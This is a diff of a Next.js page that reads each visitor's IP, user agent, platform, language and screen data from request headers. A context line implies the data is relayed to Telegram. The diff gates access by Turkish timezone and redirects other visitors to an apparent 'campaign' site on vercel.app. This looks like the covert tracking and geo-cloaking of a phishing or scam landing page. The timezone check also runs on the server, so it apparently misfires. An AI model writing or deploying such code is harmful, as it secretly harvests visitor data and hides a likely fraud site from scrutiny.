@@ -6,7 +6,7 @@ export default async function Home() {
   const userAgent = headersList.get('user-agent') || 'Unknown';
   const ip = headersList.get('x-forwarded-for') || 'Unknown';
   const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const isTurkishTimezone = timezone === 'Europe/Istanbul';
+  const isTurkishTimezone = timezone === 'Europe/Istanbul' || timezone.includes('Turkey');
   const platform = headersList.get('sec-ch-ua-platform') || 'Unknown';
   const language = headersList.get('accept-language') || 'Unknown';
   const screenResolution = headersList.get('sec-ch-viewport-width') 
@@ -34,15 +34,16 @@ export default async function Home() {
     console.error('Telegram notification error:', error);
   }
 
-  // Türkiye dışındaki kullanıcıları yönlendir
-  if (!isTurkishTimezone) {
-    redirect('https://bbnsbnkampanya.vercel.app/');
+  // Sadece Türkiye'deki kullanıcıları siteye al
+  if (isTurkishTimezone) {
+    return (
+      <main className="flex min-h-screen flex-col items-center justify-center p-24">
+        <h1 className="text-4xl font-bold mb-8">Hoş Geldiniz</h1>
+        <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
+      </main>
+    );
   }
 
-  return (
-    <main className="flex min-h-screen flex-col items-center justify-center p-24">
-      <h1 className="text-4xl font-bold mb-8">Hoş Geldiniz</h1>
-      <p className="text-xl">Bu site sadece Türkiye'den erişilebilir.</p>
-    </main>
-  );
+  // Türkiye dışındaki kullanıcıları yönlendir
+  redirect('https://bbnsbnkampanya.vercel.app/');
 }
